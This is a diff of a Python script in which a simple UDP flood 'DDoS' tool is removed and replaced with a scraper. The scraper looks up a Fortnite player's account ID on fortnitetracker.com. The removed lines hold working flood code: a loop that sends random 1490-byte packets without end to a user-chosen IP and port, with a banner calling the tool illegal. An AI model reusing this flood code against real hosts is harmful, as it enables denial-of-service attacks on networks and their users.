@@ -1,51 +1,46 @@
-print ("\033[91m")
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+######                 #####   #####   #####    ###   
+#     # ###### #    # #     # #     # #     #  #   #  
+#     # #      #    # #       #     #       # #     # 
+#     # #####  #    # ######   ######  #####  #     # 
+#     # #      #    # #     #       # #       #     # 
+#     # #       #  #  #     # #     # #        #   #  
+######  ######   ##    #####   #####  #######   ###   
+                                                      
+import requests
+import re
+import ctypes
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+print("Coded by dev github/dev6920")
 
-os.system("clear")
-os.system("figlet V-DdoS")
-print "Coded By : NSX"
-print "Author   : "
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
-os.system("clear")
-print("\033[93m")
-os.system("figlet DdoS Attack")
-print("Team : T34m V18rs")
-print ("\033[92m")
-print "[                    ] 0% "
-time.sleep(1)
-print "[=====               ] 25%"
-time.sleep(1)
-print "[==========          ] 50%"
-time.sleep(1)
-print "[===============     ] 75%"
-time.sleep(1)
-print "[====================] 100%"
-time.sleep(1)
-sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent +1
-     port = port
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+  
+  username = input("Enter username (type 'exit' to quit): ")
+
+  if username == "exit":
+    break
+
+
+  url1 = f"https://fortnitetracker.com/profile/all/{username}/events"
+
+
+  response1 = requests.get(url1)
+
+
+  page_source1 = response1.text
+
+
+  account_id_regex = r'"accountId":\s*"([^"]+)"'
+  match1 = re.search(account_id_regex, page_source1)
+
+
+  player_name_regex = r'"playerName":\s*"([^"]+)"'
+  match_player_name1 = re.search(player_name_regex, page_source1)
+
+
+  if (match1 and match_player_name1):
+    account_id = match1.group(1)
+    player_name = match_player_name1.group(1)
+    print(f"Account ID: {account_id}")
+    print(f"Username: {player_name}")
+  else:
+    print("Cant find Account ID ")
